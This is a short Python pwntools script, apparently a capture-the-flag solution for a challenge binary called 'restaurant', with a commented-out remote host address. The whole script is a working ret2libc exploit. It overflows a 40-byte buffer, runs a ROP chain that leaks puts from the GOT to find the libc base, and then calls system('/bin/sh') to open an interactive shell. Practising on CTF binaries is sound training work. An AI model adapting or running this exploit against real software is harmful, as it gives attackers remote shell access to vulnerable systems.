from pwn import *

#r = remote("159.65.92.13" ,30585)
r = process("./restaurant_patched")
e = ELF("./restaurant_patched")
libc = ELF("./libc.so.6")
r.sendlineafter('Drink something\n> ' ,'1')
pop_rdi = 0x4010a3
ret_gadget = 0x40063e
exploit = b"A" * 40 + p64(pop_rdi) + p64(e.got.puts) + p64(e.plt.puts) + p64(e.sym.fill)
r.sendafter('You can also order something else.\n> ' ,exploit)
r.recvuntil(b'Enjoy your AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa3\x10@')
libc_leak = u64(r.recvuntil(b"\x7f").strip().decode('latin-1').ljust(8,'\x00'))
libc_base = libc_leak - libc.sym.puts
exploit = b"A" * 40 + p64(pop_rdi) + p64(libc_base + next(libc.search(b"/bin/sh\x00"))) + p64(ret_gadget) + p64(libc_base + libc.sym.system)
r.sendafter('You can also order something else.\n> \x1b[0m' ,exploit)
r.interactive()
